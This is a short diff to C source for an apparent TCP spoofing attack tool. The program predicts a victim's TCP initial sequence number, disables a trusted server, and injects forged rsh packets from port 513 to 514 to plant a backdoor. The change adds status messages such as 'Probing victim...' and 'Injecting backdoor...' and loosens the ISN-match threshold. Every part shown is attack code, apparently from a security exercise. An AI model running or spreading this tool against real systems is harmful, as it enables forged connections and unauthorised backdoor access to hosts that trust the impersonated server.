@@ -79,6 +79,7 @@ void probeXterminal() {
 }
 
 uint32_t calculateISN() {
+  printf("Probing victim...\n");
   const u_char *data = NULL;
   struct pcap_pkthdr *header = NULL;
   uint32_t isn = 0, prevIsn = 0, difference = 0, prevDifference = 0,
@@ -111,7 +112,7 @@ uint32_t calculateISN() {
           match = 0;
         }
       }
-      if (match > 4) {
+      if (match > 3) {
         printf("Predicted ISN: %u\n", predictedIsn);
         freePcap(pcap);
         return predictedIsn;
@@ -147,6 +148,7 @@ uint16_t setupBackdoor(char *buffer, char *clientUsername, char *serverUsername,
 }
 
 void injectPacket(uint32_t predictedIsn) {
+  printf("Injecting backdoor...\n");
   Libnet handshakeLibnet = makeLibnet();
   uint16_t payloadLength = 0, sourcePort = 513, destinationPort = 514;
   uint32_t serverSequenceNumber = 256000, acknowledgementNumber = 0;
@@ -193,8 +195,11 @@ void injectPacket(uint32_t predictedIsn) {
 }
 
 int main(void) {
+  printf("Disabling server...\n");
   toggleServer(DISABLE_SERVER);
   injectPacket(calculateISN());
+  printf("Enabling server...\n");
   toggleServer(ENABLE_SERVER);
+  printf("Finished!\n");
   return 0;
 }
